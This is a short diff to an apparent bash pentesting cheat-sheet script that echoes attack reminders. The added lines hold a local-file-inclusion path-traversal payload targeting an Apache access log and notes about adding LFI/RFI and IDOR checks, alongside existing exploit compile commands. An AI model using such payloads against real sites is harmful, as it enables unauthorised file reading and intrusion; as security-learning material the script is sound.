@@ -1,6 +1,8 @@
 #!/bin/bash
 #This script is for pentesting/learning security practices.
 #Contact me here: https://hackforums.net/member.php?action=profile&uid=2682887
+#Still have to add a bunch of LFI/RFI stuff, IDOR as well 
+#Always check cookies...
 
 clear
 ##Enter website target and it defines it as $T and target domain as $TD
@@ -374,6 +376,10 @@ function menu {
       echo "gcc -o exploit exploit.c"
       echo ""
       echo -e "\033[34mCompile .exe on linux\033[0m"
+      echo ""
+      echo -e "\033[34mRemember to check for LFI example below, change index to a path you know\033[0m"
+      echo -e "/?view=./index/../../../../../../../var/log/apache2/access.log&ext"
+      echo ""
       echo "i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe"
       ;;
     shell)
